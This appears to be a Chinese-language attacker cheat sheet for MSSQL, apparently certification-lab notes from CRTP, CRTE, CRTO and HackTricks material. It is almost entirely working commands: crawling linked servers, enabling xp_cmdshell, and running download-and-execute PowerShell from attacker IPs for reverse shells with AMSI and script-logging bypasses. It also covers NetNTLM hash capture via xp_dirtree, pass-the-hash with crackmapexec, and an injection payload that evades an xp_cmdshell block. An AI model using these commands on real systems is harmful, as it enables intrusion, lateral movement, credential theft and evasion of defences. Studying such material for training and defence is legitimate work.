# MSSQL（CRTP,CRTE）

使用PowerupSQL.psd1

## 举当前账号是否有任何可用的mssql链接
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## 检查当前账号是否有权限进入mssql
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
```

## 查看指定链接的信息
```
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

## 自动爬取数据库链接
```
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
```

## 对指定链接执行系统命令
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

## 执行系统命令，返回一个rev shell

简单版本
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
```

绕过AMSI
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcpEx.ps1)"'''
```

指定在db-sqlsrv上操作
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```


## 启用RPC OUT和xp_cmdshell

```
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"

Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""

Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
```


## 在HeidiSQL客户端操作

找当前链接下的链接
```
select * from master..sysservers
```

枚举指定链接下面的连接
```
select * from openquery("192.168.23.25",'select * from master..sysservers')
```

 嵌套链接，执行sql语句
```
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
```

获取一个rev shell
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell ''''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcp.ps1)"'''''')')
```


# MSSQL（CRTO）

使用工具：[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

枚举某个实例下的链接
```
powershell Get-SQLQuery -Instance "sql" -Query "SELECT * FROM master..sysservers"
```

查找MSSQL实例的cmdlets
```
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP
```

找是否可以连接数据库
```
Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl
```

详细的连接实例信息

```
Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"
```

执行sql命令
```
Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"
```

```mssqlclient.py```连接mssql，需要账号密码

```
python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```

## NetNTLM Capture

方法1

1. 监听
首先在本地监听，使用[InveighZero](https://github.com/Kevin-Robertson/InveighZero)进行监听，需要本地管理员权限
```
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```
2. 触发
在mssql上，执行命令```EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1```，10.10.17.231的IP地址就是上面监听的机器

方法2

可以使用 WinDivert + rportfwd把smb流量转发到teamserver（就是kali机），然后再kali使用[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)监听，这个方法前面几章已经有展示。

监听
```
root@kali:~# python3 /usr/local/bin/smbserver.py -smb2support pwn .
```


## MSSQL Command Execution

PowerUpSQL使用```Invoke-SQLOSCmd```命令

```
beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\svc_mssql
```

原生MSSQL使用``` xp_cmdshell ```命令
```
EXEC xp_cmdshell 'whoami';
```

查看xp_cmdshell是否开启
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

value=0,表示没有开启


开启xp_cmdshell功能
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

执行powershell命令
```
EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';
```

## MS SQL Lateral Movement

1. 获取实例

## 方法一，手动抓取

枚举当前机器的mssql的实例
```
SELECT * FROM master..sysservers;
```


可以利用上面的实例运行sql语句

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

**注意，上面实例使用双引号，sql语句使用单引号。**


查看某个实例是否有xp_cmdshell权限
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

如果被禁用，开启xp_cmdshell
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
```

## 方法二，自动抓取 


使用```Get-SQLServerLinkCrawl```命令

```
beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"

Version     : SQL Server 2016 
Instance    : SRV-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1}
User        : DEV\bfarmer
Links       : {SQL-1.CYBERBOTIC.IO}

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       : {SQL01.ZEROPOINTSECURITY.LOCAL}

Version     : SQL Server 2019 
Instance    : SQL01\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO, SQL01.ZEROPOINTSECURITY.LOCAL}
User        : sa
Links       : 
```

留意上面的实例链：```SRV-1 > SQL-1.CYBERBOTIC.IO > SQL01.ZEROPOINTSECURITY.LOCAL```

2. 执行系统shell

在```sql-1.cyberbotic.io```实例上执行系统shell

```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''' )
```

在```sql01.zeropointsecurity.local```实例上执行系统shell

```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''' '')' )
```

# hacktricks里的技巧

# Get Permissions


## Show all different securables names
```
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
```
## Show all possible permissions in MSSQL
```
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
```

## Get all my permissions over securable type SERVER
```
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

## Get all my permissions over a database
```
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

## Get members of the role "sysadmin"
```
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
```

## Get if the current user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Get users that can run xp_cmdshell
```
Use master
EXEC sp_helprotect 'xp_cmdshell'
```


# Execute OS Commands

## Username + Password + CMD command
```
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
```

## Username + Hash + PS command
```
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```

## Check if xp_cmdshell is enabled
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

## This turns on advanced options and is needed to configure xp_cmdshell
```
sp_configure 'show advanced options', '1'
RECONFIGURE
```

## This enables xp_cmdshell
```
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

## One liner
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

## Quickly check what the service account is via xp_cmdshell
```
EXEC master..xp_cmdshell 'whoami'
```


## Get Rev shell
```
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```

## Bypass blackisted "EXEC xp_cmdshell"
```
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```